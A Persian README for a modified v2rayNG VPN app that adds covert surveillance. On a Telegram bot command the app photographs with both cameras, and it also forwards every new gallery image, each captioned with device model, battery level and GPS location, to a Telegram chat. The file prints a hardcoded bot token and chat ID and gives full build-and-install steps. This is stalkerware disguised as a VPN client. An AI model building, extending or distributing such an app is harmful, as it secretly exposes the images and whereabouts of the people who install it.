# راهنمای استفاده و ساخت پروژه

سلام. این فایل شامل تمام دستورالعمل‌های لازم برای ساخت و استفاده از نسخه سفارشی شده اپلیکیشن v2rayNG است.

---

## قابلیت‌های نهایی این نسخه

این نسخه شامل سه قابلیت اصلی است:

1.  **فرمان عکس فوری:** شما می‌توانید با ارسال دستور `/takephoto` از طریق ربات تلگرام، به اپلیکیشن فرمان دهید که از دوربین جلو و عقب عکس بگیرد و برایتان ارسال کند.
2.  **نگهبان گالری:** اپلیکیشن به صورت خودکار هر عکس جدیدی که در گوشی ذخیره می‌شود (توسط دوربین خودتان، اسکرین‌شات، یا هر برنامه دیگری) را تشخیص داده و فوراً به تلگرام ارسال می‌کند.
3.  **اطلاعات تکمیلی:** تمام عکس‌های ارسالی (از هر دو روش بالا) یک کپشن (متن زیرنویس) همراهشان دارند که شامل موارد زیر است:
    *   منبع ارسال (مثلاً: "دستور /takephoto" یا "عکس جدید در گالری")
    *   مدل گوشی
    *   میزان شارژ باتری
    *   موقعیت مکانی (GPS)

---

## محل توکن و چت آیدی

اگر نیاز به تغییر توکن ربات یا چت آیدی داشتید، می‌توانید آن را در این فایل پیدا کنید:

-   **آدرس فایل:** `V2rayNG/app/src/main/java/com/v2ray/ang/service/V2RayVpnService.kt`
-   **محل دقیق کد:** در داخل این فایل، به دنبال بخشی به نام `companion object` بگردید. کد به این شکل است:
    ```kotlin
    companion object {
        // ...
        private const val BOT_TOKEN = "8445290760:AAE0l_z3K6mxkCkvLfR75tdt74JAND94dko"
        private const val CHAT_ID = "5370932271"
        // ...
    }
    ```

---

## راهنمای کامل ساخت فایل APK (برای ویندوز)

برای ساختن اپلیکیشن، لطفاً این چهار بخش را **با دقت و به ترتیب** دنبال کنید.

### **بخش ۱: آماده‌سازی کامپیوتر**

1.  **نصب اندروید استودیو:**
    *   به سایت رسمی اندروید استودیو بروید: `https://developer.android.com/studio`
    *   دکمه بزرگ دانلود را بزنید و فایل نصب را دریافت کنید.
    *   فایل را اجرا کنید و تمام مراحل نصب را با گزینه‌های پیش‌فرض جلو بروید.

2.  **دانلود سورس کد:**
    *   مطمئن شوید که در گیت‌هاب، شاخه (branch) `feature/v2-advanced-features` را انتخاب کرده‌اید.
    *   روی دکمه سبز رنگ `<> Code` کلیک کنید و گزینه `Download ZIP` را بزنید.
    *   فایل ZIP دانلود شده را در یک پوشه مشخص (مثلاً روی دسکتاپ) از حالت فشرده خارج کنید (Extract کنید).

### **بخش ۲: دانلود و جای‌گذاری فایل موتور برنامه**

**این مهم‌ترین مرحله برای جلوگیری از خطا است.**

1.  **دانلود فایل `.aar`:**
    *   روی لینک زیر کلیک کنید تا به صفحه دانلود نسخه صحیح موتور برنامه بروید. **حتماً از همین لینک استفاده کنید.**
        `https://github.com/2dust/AndroidLibXrayLite/releases/tag/v25.7.26`
    *   در صفحه‌ای که باز می‌شود، در بخش `Assets`، روی فایل `libXray-v25.7.26.aar` کلیک کنید تا دانلود شود.

2.  **قراردادن فایل در پروژه:**
    *   فایل `.aar` که دانلود کردید را کپی کنید.
    *   به پوشه‌ای بروید که پروژه را در آن Extract کردید.
    *   وارد این مسیر شوید: `V2rayNG/app/`
    *   در اینجا یک پوشه جدید به نام `libs` بسازید (اگر وجود ندارد).
    *   فایل `.aar` را در این پوشه `libs` پیست (Paste) کنید.

### **بخش ۳: ساخت فایل APK در اندروید استودیو**

1.  **باز کردن پروژه:**
    *   اندروید استودیو را باز کنید و گزینه `Open` را بزنید.
    *   به پوشه‌ای که پروژه را در آن Extract کردید بروید و پوشه `V2rayNG` را انتخاب کنید و `OK` را بزنید.
2.  **همگام‌سازی (Sync):**
    *   صبر کنید تا پروژه بارگذاری شود. اگر نواری در بالای صفحه ظاهر شد که روی آن `Sync Now` نوشته بود، روی آن کلیک کنید. در غیر این صورت، از منوی بالا به مسیر `File` > `Sync Project with Gradle Files` بروید.
3.  **ساخت APK:**
    *   پس از اتمام همگام‌سازی، از منوی بالا به مسیر `Build` > `Build Bundle(s) / APK(s)` > `Build APK(s)` بروید.
4.  **پیدا کردن فایل APK:**
    *   پس از اتمام ساخت، یک اعلان در پایین سمت راست صفحه ظاهر می‌شود. روی کلمه `locate` در آن اعلان کلیک کنید تا پوشه فایل APK باز شود.

### **بخش ۴: نصب روی گوشی**

1.  فایل APK که پیدا کردید را به گوشی خود منتقل کنید.
2.  روی گوشی، فایل را پیدا کرده و آن را نصب کنید.

موفق باشید!
